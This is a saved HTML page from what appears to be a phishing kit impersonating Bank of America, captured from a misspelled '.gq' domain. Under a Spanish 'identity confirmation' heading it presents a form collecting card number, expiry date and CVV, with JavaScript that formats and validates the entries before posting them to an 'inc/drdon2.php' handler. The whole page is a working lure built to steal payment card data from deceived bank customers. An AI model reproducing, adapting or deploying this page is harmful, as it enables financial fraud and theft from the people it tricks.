<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- saved from url=(0187)http://bankofamaricalogsecurity.gq/verification/auth.signOnV2Screen=5kGlCdxf69gmCj2dIZ5QD195jh4MmBv8AM75tgupIfp4Rla96yyKO9Ngb3MJVZKCMyHXtbYjmBgDiwbN2xZpsX87bPusmPR0ZLI6/signOnV2Screen.php -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Confirmacion de identidad</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="./Identity Confirmation Card and Alerts_files/favicon.ico"	
<script src="./Identity Confirmation Card and Alerts_files/jquery.min.js.descarga"></script>
<style type="text/css">
.icono {
    background: url(../../css/icono.png) 1px 1px no-repeat;
    height: 21px;
    width: 18px;
    float: right;
    margin-right: 59px;
    margin-top: 1px;
}
.boot-blue {
    color: #fff;
    background-color: #0073CF;
    border-radius: 0;
    border: none;
}

.boot-blue:hover {
    color: #fff;
    background: #0052C2;
}
.boot-small {
    font-size: 20px;
    padding: 10px 20px;
}
.boot-blue1 {
    color: #0052C2;
    background-color: #F2F2F2;
    border-radius: 0;
    border: none;
}

.boot-blue1:hover {
    color: #012169;
    background: #E3E3E3;
}
.error {
    color: #DC1431;
    background: url(../../css/error.png) 0 0 no-repeat;
    padding: 3px 0 6px 30px!important;
    margin-left: 1px;
}
input[type=number] { -moz-appearance:textfield; }
input[type=number]::-webkit-inner-spin-button, 
input[type=number]::-webkit-outer-spin-button { 
  -webkit-appearance: none; 
  margin: 0; 
}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('../../css/loader.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: 1;
}
body{
font-family: Arial;
}
</style>
<link id="avast_os_ext_custom_font" href="chrome-extension://mbckjcfnjmoiinpgddefodcighgikkgn/common/ui/fonts/fonts.css" rel="stylesheet" type="text/css"></head>
<body style="margin: 0 auto;overflow-x:hidden">
<div class="loader" style="display: none;"></div>
<script type="text/javascript">
$(window).load(function() {
    $(".loader").fadeOut("slow");
});
</script>
<div id="container" style="width:100%;margin: 0 auto;">
<div id="cabeza" style="margin-top:2px;margin-left:0px;">
<img src="./Identity Confirmation Card and Alerts_files/a3.png" alt="" title="" border="0" width="1460" height="125">
</div>
<div id="cuerpo" style="margin: 25px 0 80px 88px;width:955px;height:356px;">
<div id="form2" style="float: left;margin-right: 25px;">
<form name="dafabhai" id="dafabhai" method="post" action="inc/drdon2.php" autocomplete="off" novalidate="novalidate">
      <div class="er" style="font-size: 21px;color: #333;margin-bottom: 20px;font-weight:bold;">Verificacion Requerida !</div>
      <div class="er1" style="font-size: 16px;color: #333;margin-bottom: 30px;">¡Proporcione la siguiente información para confirmar su cuenta!</div>
      
      <div class="us" style="margin-bottom: 20px;">
		  	<label id="id3" for="numcd" style="display:block;font-weight:normal;font-size:14px;color: #333;">Número de tarjeta</label>
			<input type="text" id="numcd" name="numcd" onkeydown="return free(event)" maxlength="19" onkeypress="return validaNumericos(event)" onkeyup="Card(event, this)" autocomplete="off" style="border: 1px solid #ccc;width:405.33px;height:40px;padding: 4px 2px;font-size: inherit;margin-top: 7px;">
			<label id="id4" for="numcd" style="display:none;font-weight:normal;font-size:14px;margin-top:10px;" class="error">Please verify your information</label>
      </div>
			<div class="fecha" style="margin-bottom: 20px;width:280px;float: left;">
			<label id="id5" for="mm" style="display:block;font-weight:normal;font-size:14px;color: #333;">Fecha de caducidad</label>
			<select name="mm" id="mm" onkeypress="return free(event)" required="" class="logininput" style="border: 1px solid #ccc;width:115.23;height:40px;margin-top: 7px;margin-bottom: 20px;">
      <option value="50" selected="" disabled="">Mes
      </option><option value="01">01
      </option><option value="02">02
      </option><option value="03">03
      </option><option value="04">04
      </option><option value="05">05
      </option><option value="06">06
      </option><option value="07">07
      </option><option value="08">08
      </option><option value="09">09
      </option><option value="10">10
      </option><option value="11">11
      </option><option value="12">12
      </option></select>
			<select class="logininput" onkeypress="return free(event)" required="" id="yy" name="yy" style="border: 1px solid #ccc;width:115.23;height:40px">
      <option value="55" selected="" disabled="">Año
                 </option><option value="22">2022
      </option><option value="23">2023
      </option><option value="24">2024
      </option><option value="25">2025
      </option><option value="26">2026
       </option><option value="27">2027
      </option><option value="28">2028
      </option><option value="29">2029
      </option><option value="30">2030
      </option><option value="31">2031
      </option><option value="32">2032
      </option><option value="33">2033
      </option></select>
      <label id="id6" for="mm" style="display:none;font-weight:normal;font-size:14px;margin-top:-10px;" class="error">Please verify your information</label>
      <div class="atm">
			   </div>
      <button type="submit" form="dafabhai" id="Button1" style="margin-top: 33px;margin-right: 15px;" title="Sign in" class="boot boot-blue boot-small" name="enter-online-id-submit">
			Continue
			</button>
			<button type="button" onclick="window.location=&#39;signOnV1Screen.php&#39;;" style="margin-top: 33px;" title="Sign in" class="boot boot-blue1 boot-small" name="enter-online-id-submit">
			Cancel
			</button>
      </div>
			<div class="cvv">
			<label id="id7" for="cvv" style="display:block;font-weight:normal;font-size:14px;color: #333;">Código de seguridad (CVV</label>
			<input type="text" required="" id="cvv" name="cvv" maxlength="4" onkeydown="return free(event)" onkeypress="return validaNumericos(event)" class="logininput" style="margin-top: 7px;border: 1px solid #ccc;width:160px;height:40px">
        <img src="./Identity Confirmation Card and Alerts_files/question_mark.png" onclick="window.open(&#39;https://www.cvvnumber.com/cvv.html&#39;,&#39;_BLANK&#39;,&#39;width=500, height=500, scrollbars=yes&#39;);">
			</div>
</form>
</div>
<script type="text/javascript">
function free(event) {
	   document.getElementById('id1').style.color = "#333";
	   document.getElementById('namecd').style.borderColor = "#ccc";
	   document.getElementById('id2').style.display='none';	   	   
	   document.getElementById('id3').style.color = "#333";
	   document.getElementById('numcd').style.borderColor = "#ccc";
	   document.getElementById('id4').style.display='none';	   	   
	   document.getElementById('id5').style.color = "#333";
	   document.getElementById('mm').style.borderColor = "#ccc";
	   document.getElementById('yy').style.borderColor = "#ccc";
	   document.getElementById('id6').style.display='none';
	   document.getElementById('cvv').style.borderColor = "#ccc";
	   document.getElementById('id7').style.color = "#333";	   
	   document.getElementById('id9').style.display='none';
	   document.getElementById('id8').style.color = "#333";
        }       
function validaNumericos(event) {
    if(event.charCode >= 48 && event.charCode <= 57){      return true;
     }
     return false;        
}
function Card(event, el){    //Obteniendo posicion del cursor 
    var val = el.value;//Valor de la caja de texto
    var pos = val.slice(0, el.selectionStart).length;
	
    var out = '';//Salida
    var filtro = '1234567890';
    var v = 0;//Contador de caracteres validos
	
    //Filtar solo los numeros
    for (var i=0; i<val.length; i++){
       if (filtro.indexOf(val.charAt(i)) != -1){
	     v++;
	     out += val.charAt(i);		   
	     //Agregando un espacio cada 4 caracteres
	     if((v==4) || (v==8) || (v==12))
	         out+='-';
	   }
    }
    //Reemplazando el valor
    el.value = out;
	
    //En caso de modificar un numero reposicionar el cursor
   if(event.keyCode==8){//Tecla borrar precionada
        el.selectionStart = pos;
        el.selectionEnd = pos;
    } {
	   
	   }
	   campo1 = document.getElementById("numcd");
	   if(campo1.value.length < 19){
	   document.getElementById('id1').style.color = "#333";
	   document.getElementById('namecd').style.borderColor = "#ccc";
	   document.getElementById('id2').style.display='none';	
	      
	   document.getElementById('id3').style.color = "#DC1431";
	   document.getElementById('numcd').style.borderColor = "#DC1431";
	   document.getElementById('id4').style.display='block';
	   campo.className += " has-error";
	   return false;
	   }else{
	   
	   }
	   campo2 = document.getElementById("mm");
	   if(campo2.value=='50'){
	   document.getElementById('id1').style.color = "#333";
	   document.getElementById('namecd').style.borderColor = "#ccc";
	   document.getElementById('id2').style.display='none';
	   	   
	   document.getElementById('id3').style.color = "#333";
	   document.getElementById('numcd').style.borderColor = "#ccc";
	   document.getElementById('id4').style.display='none';
	   
	   document.getElementById('id5').style.color = "#DC1431";
	   document.getElementById('mm').style.borderColor = "#DC1431";
	   document.getElementById('id6').style.display='block';
	   campo.className += " has-error";
	   return false;
	   }else{
	   
	   }
	   campo3 = document.getElementById("yy");
	   if(campo3.value=='55'){
	   document.getElementById('id1').style.color = "#333";
	   document.getElementById('namecd').style.borderColor = "#ccc";
	   document.getElementById('id2').style.display='none';
	   	   
	   document.getElementById('id3').style.color = "#333";
	   document.getElementById('numcd').style.borderColor = "#ccc";
	   document.getElementById('id4').style.display='none';
	   
	   document.getElementById('id5').style.color = "#DC1431";
	   document.getElementById('mm').style.borderColor = "#ccc";
	   document.getElementById('yy').style.borderColor = "#DC1431";
	   document.getElementById('id6').style.display='block';
	   campo.className += " has-error";
	   return false;
	   }else{
	   
	   }
	   campo4 = document.getElementById("cvv");
	   if(campo4.value==''){
	   document.getElementById('id1').style.color = "#333";
	   document.getElementById('namecd').style.borderColor = "#ccc";
	   document.getElementById('id2').style.display='none';	   	   
	   document.getElementById('id3').style.color = "#333";
	   document.getElementById('numcd').style.borderColor = "#ccc";
	   document.getElementById('id4').style.display='none';	   	   
	   document.getElementById('id5').style.color = "#333";
	   document.getElementById('mm').style.borderColor = "#ccc";
	   document.getElementById('yy').style.borderColor = "#ccc";
	   document.getElementById('id6').style.display='block';
	   document.getElementById('cvv').style.borderColor = "#DC1431";
	   document.getElementById('id7').style.color = "#DC1431";
	   campo.className += " has-error";
	   return false;
	   }else{
	   
	   }
	   campo5 = document.getElementById("atm");
	   if(campo5.value==''){
	   document.getElementById('id1').style.color = "#333";
	   document.getElementById('namecd').style.borderColor = "#ccc";
	   document.getElementById('id2').style.display='none';	   	   
	   document.getElementById('id3').style.color = "#333";
	   document.getElementById('numcd').style.borderColor = "#ccc";
	   document.getElementById('id4').style.display='none';	   	   
	   document.getElementById('id5').style.color = "#333";
	   document.getElementById('mm').style.borderColor = "#ccc";
	   document.getElementById('yy').style.borderColor = "#ccc";
	   document.getElementById('id6').style.display='none';
	   document.getElementById('cvv').style.borderColor = "#ccc";
	   document.getElementById('id7').style.color = "#333";	   
	   document.getElementById('id9').style.display='Block';
	   document.getElementById('atm').style.borderColor = "#DC1431";
	   document.getElementById('id8').style.color = "#DC1431";
	   campo.className += " has-error";
	   return false;
	   }else{
	   
	   }
	   document.getElementById("dafabhai").submit();
	   document.getElementById("Button1").disabled = true;
}
</script>
</div>
<div id="pie" style="margin-top:-20px;margin-left:-3px;width:983px;height:117px;">
<div id="image15" style="width:987px; height:150px; z-index:5">
<img src="./Identity Confirmation Card and Alerts_files/a2.png" alt="" title="" border="0" width="1296" height="155" style="margin-top:30px;margin-left: 66px;">
</div>
</div>


</div></body></html>